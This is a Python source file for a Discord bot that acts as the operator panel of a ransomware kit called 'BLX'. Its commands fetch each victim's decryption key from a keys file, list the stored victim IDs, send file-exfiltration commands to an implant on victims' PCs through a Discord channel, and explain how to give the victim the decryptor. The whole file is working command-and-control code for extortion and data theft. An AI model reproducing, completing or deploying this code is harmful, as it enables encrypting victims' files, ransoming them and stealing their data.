# Copyright (c) BLX - Ransomware Key Bot
# Run this bot with the same Token and Server ID as in the Ransomware config.
# Command: !key <victim_id>  -> returns the decryption key for that victim.

import os
import json
import sys

try:
    import discord
    from discord.ext import commands
except ImportError:
    print("Install discord.py: pip install discord.py")
    sys.exit(1)

# Config: same directory as this script (Ransomware folder)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(SCRIPT_DIR, "BLX_ransomware_bot_config.json")
# Keys: parent project 1-Output\VirusBuilder, or next to this script
KEYS_PATHS = [
    os.path.normpath(os.path.join(SCRIPT_DIR, "..", "1-Output", "VirusBuilder", "BLX_ransomware_keys.json")),
    os.path.join(SCRIPT_DIR, "BLX_ransomware_keys.json"),
]

def load_config():
    if not os.path.exists(CONFIG_PATH):
        print(f"Create config file: {CONFIG_PATH}")
        print('Content: {"token": "YOUR_BOT_TOKEN", "server_id": "YOUR_SERVER_ID", "exfil_channel_id": "", "allowed_role_ids": [], "log_file": ""}')
        return None, None, None, [], ""
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        token = data.get("token", "").strip()
        server_id = data.get("server_id", "").strip()
        exfil_channel_id = data.get("exfil_channel_id", "").strip()
        allowed = data.get("allowed_role_ids", [])
        if isinstance(allowed, list):
            allowed_role_ids = [str(x).strip() for x in allowed if str(x).strip()]
        else:
            allowed_role_ids = []
        log_file = data.get("log_file", "").strip()
        return token, server_id, exfil_channel_id, allowed_role_ids, log_file
    except Exception as e:
        print(f"Error reading config: {e}")
        return None, None, None, [], ""


def log_command(ctx, command_name, args_text=""):
    """Log command to console and optionally to log file."""
    import datetime
    author = getattr(ctx.author, "name", "?") if ctx and hasattr(ctx, "author") else "?"
    channel = getattr(ctx.channel, "name", "?") if ctx and hasattr(ctx, "channel") else "?"
    line = f"[{datetime.datetime.utcnow().isoformat()}Z] !{command_name} {args_text} | by {author} (#{channel})\n"
    print(line.strip())
    log_path = getattr(bot, "_log_file", None)
    if log_path:
        try:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass


def check_allowed_role(ctx):
    """Return True if user is allowed (no restriction or has one of allowed_role_ids)."""
    allowed = getattr(bot, "_allowed_role_ids", None) or []
    if not allowed:
        return True
    if not ctx or not hasattr(ctx, "author"):
        return False
    try:
        author_roles = [str(r.id) for r in getattr(ctx.author, "roles", [])]
        return any(rid in author_roles for rid in allowed)
    except Exception:
        return False

def load_keys():
    for path in KEYS_PATHS:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return json.load(f), path
            except Exception:
                pass
    return {}, None

def save_keys(keys_dict, path):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(keys_dict, f, indent=2)
    except Exception:
        pass

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"BLX Ransomware Bot connected as {bot.user} (ID: {bot.user.id})")
    print("Commands: !key [channel_id]  |  !keys  |  !exfil  |  !info [victim_id]  |  !decryptor  |  !help")

@bot.command(name="key")
async def get_key(ctx, victim_id: str = None, channel_id: str = None):
    if not check_allowed_role(ctx):
        await ctx.send("You do not have permission to use this command.")
        return
    log_command(ctx, "key", f"{victim_id or ''} {channel_id or ''}".strip())
    if victim_id is None or not victim_id.strip():
        await ctx.send("Usage: `!key <victim_id>` or `!key <victim_id> <channel_id>` to send key to a channel.")
        return
    victim_id = victim_id.strip()
    keys_dict, keys_path = load_keys()
    if not keys_path:
        await ctx.send("No keys file found. Put `BLX_ransomware_keys.json` in the same folder as the builder output or next to this script.")
        return
    key_b64 = keys_dict.get(victim_id)
    if key_b64 is None:
        await ctx.send(f"No key found for Victim ID: `{victim_id}`. Check the ID or wait for the victim to run the payload (key is also sent to webhook).")
        return
    send_to_channel = channel_id and str(channel_id).strip()
    if send_to_channel:
        try:
            ch = bot.get_channel(int(send_to_channel))
            if ch is None:
                ch = await bot.fetch_channel(int(send_to_channel))
            await ch.send(f"**Decryption key for Victim ID `{victim_id}`** (requested by {ctx.author}):\n```\n{key_b64}\n```\nGive this key to the victim to use with the BLX decryptor.")
            await ctx.send(f"Key for `{victim_id}` sent to <#{send_to_channel}>.")
        except discord.Forbidden:
            await ctx.send("I cannot send messages in that channel.")
        except discord.NotFound:
            await ctx.send("Channel not found.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    else:
        try:
            await ctx.author.send(f"**Decryption key for Victim ID `{victim_id}`:**\n```\n{key_b64}\n```\nGive this key to the victim to use with the BLX decryptor.")
            await ctx.send("Key sent in DM.")
        except discord.Forbidden:
            await ctx.send("I cannot DM you. Enable DMs from server members or use `!key <victim_id> <channel_id>` to send to a channel.")
        except Exception as e:
            await ctx.send(f"Error: {e}")

@bot.command(name="keys")
async def list_keys(ctx):
    if not check_allowed_role(ctx):
        await ctx.send("You do not have permission to use this command.")
        return
    log_command(ctx, "keys", "")
    keys_dict, keys_path = load_keys()
    if not keys_path:
        await ctx.send("No keys file found.")
        return
    if not keys_dict:
        await ctx.send("No victim IDs stored yet. Build a ransomware payload to generate keys.")
        return
    ids = list(keys_dict.keys())
    text = "Victim IDs in keys file:\n```\n" + "\n".join(ids[:50]) + ("\n..." if len(ids) > 50 else "") + "\n```\nUse `!key <victim_id>` to get the key."
    await ctx.send(text)

@bot.command(name="exfil")
async def exfil_file(ctx, victim_id: str = None, path: str = None, *extra):
    if not check_allowed_role(ctx):
        await ctx.send("You do not have permission to use this command.")
        return
    if victim_id is None or not victim_id.strip():
        await ctx.send("Usage: `!exfil <victim_id> <path>`  (path: e.g. C:\\Users\\victim\\Desktop\\file.txt)")
        return
    log_command(ctx, "exfil", f"{victim_id} {path or ''} {' '.join(extra)}".strip())
    victim_id = victim_id.strip()
    if path is None:
        path = ""
    path = (path + " " + " ".join(extra)).strip().strip('"').strip("'")
    if not path:
        await ctx.send("Usage: `!exfil <victim_id> <path>`  (path: full path to file on victim PC, max 8MB)")
        return
    exfil_channel_id = getattr(bot, "_exfil_channel_id", None)
    if not exfil_channel_id:
        await ctx.send("Exfil not configured. Add `exfil_channel_id` to your config (channel where victim listener runs).")
        return
    try:
        channel = bot.get_channel(int(exfil_channel_id))
        if channel is None:
            channel = await bot.fetch_channel(int(exfil_channel_id))
        cmd = "!exfil " + victim_id + " " + path
        await channel.send(cmd)
        await ctx.send(f"Exfil command sent for victim `{victim_id}`. File will appear in <#{exfil_channel_id}> if victim is online and path is valid (under C:\\Users, max 8MB).")
    except discord.NotFound:
        await ctx.send("Exfil channel not found. Check `exfil_channel_id` in config.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="info")
async def bot_info(ctx, victim_id: str = None):
    if not check_allowed_role(ctx):
        await ctx.send("You do not have permission to use this command.")
        return
    log_command(ctx, "info", victim_id or "")
    keys_dict, keys_path = load_keys()
    if victim_id and victim_id.strip():
        vid = victim_id.strip()
        if keys_path and vid in (keys_dict or {}):
            await ctx.send(f"Key **is stored** for Victim ID `{vid}`. Use `!key {vid}` to retrieve it.")
        else:
            await ctx.send(f"No key found for Victim ID `{vid}`.")
        return
    # Bot info
    n = len(keys_dict) if keys_dict else 0
    exfil_ok = "yes" if getattr(bot, "_exfil_channel_id", None) else "no"
    roles_ok = "restricted" if (getattr(bot, "_allowed_role_ids", None) or []) else "all"
    msg = (
        f"**BLX Ransomware Bot**\n"
        f"Keys file: `{keys_path or 'not found'}`\n"
        f"Victims in file: **{n}**\n"
        f"Exfil channel configured: **{exfil_ok}**\n"
        f"Commands allowed for: **{roles_ok}**"
    )
    await ctx.send(msg)


@bot.command(name="decryptor")
async def bot_decryptor(ctx):
    if not check_allowed_role(ctx):
        await ctx.send("You do not have permission to use this command.")
        return
    log_command(ctx, "decryptor", "")
    await ctx.send(
        "**BLX Decryptor**\n"
        "Give the victim **BLX_Decryptor.exe** (built with the Virus-Builder when Ransomware is enabled).\n"
        "The victim: 1) Pastes the decryption key (from `!key <victim_id>`), 2) Selects the folder to decrypt (default: user folder), 3) Clicks \"Decrypt .blx files\".\n"
        "After successful decryption, traces are removed and the decryptor uninstalls itself."
    )


@bot.command(name="help")
async def bot_help(ctx):
    await ctx.send(
        "**BLX Ransomware Bot**\n"
        "`!key <victim_id>` - Get decryption key (DM). `!key <victim_id> <channel_id>` - Send key to a channel.\n"
        "`!keys` - List all stored victim IDs.\n"
        "`!exfil <victim_id> <path>` - Request file from victim (path under C:\\Users, max 8MB). Requires exfil_channel_id in config.\n"
        "`!info` - Bot status. `!info <victim_id>` - Check if key exists for victim.\n"
        "`!decryptor` - Instructions for the victim (BLX_Decryptor.exe).\n"
        "Keys are read from `BLX_ransomware_keys.json` (created when you build with Ransomware enabled)."
    )

def main():
    token, server_id, exfil_channel_id, allowed_role_ids, log_file = load_config()
    if not token or not server_id:
        print("Missing token or server_id. Edit Ransomware\\BLX_ransomware_bot_config.json (copy from .example).")
        sys.exit(1)
    bot._exfil_channel_id = exfil_channel_id or None
    bot._allowed_role_ids = allowed_role_ids or []
    bot._log_file = log_file or None
    try:
        bot.run(token)
    except discord.LoginFailure:
        print("Invalid token. Check BLX_ransomware_bot_config.json")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
